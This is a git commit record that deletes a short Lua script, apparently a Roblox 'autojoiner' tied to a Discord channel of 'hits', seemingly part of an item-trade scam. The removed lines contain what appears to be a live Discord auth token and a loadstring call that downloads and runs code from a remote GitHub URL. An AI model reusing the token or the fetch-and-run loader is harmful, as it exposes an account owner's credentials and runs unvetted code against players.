058173d4b38b3ae7b8f7969045160274d80ccb17
asiazzz <rubianiasia0@gmail.com>
2026-01-07 20:52:32 +0100

    Delete autojoin.lua

--- autojoin.lua
+++
@@ -1,5 +0,0 @@
-token = "ODU1MDIxMjY2OTkwMTM3MzU1.GGkQUd.X7rwfVtngMm_mObSo40Dyf3jlu2WDXj07fx3kA" -- Discord Token here (DISCORD AUTH TOKEN) TUTORIAL: https://www.youtube.com/watch?v=LnBnm_tZlyU
-channelId = "1458519623304478937" -- Channel ID that your hits are in. TUTORIAL: https://www.youtube.com/watch?v=YjiQ7CajAgg
-delay = 0.1 -- How many seconds it will wait to chat after loading is done. If you have problems with not getting trades, try making delay higher
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Autojoiner/refs/heads/main/autojoiner.lua'))()
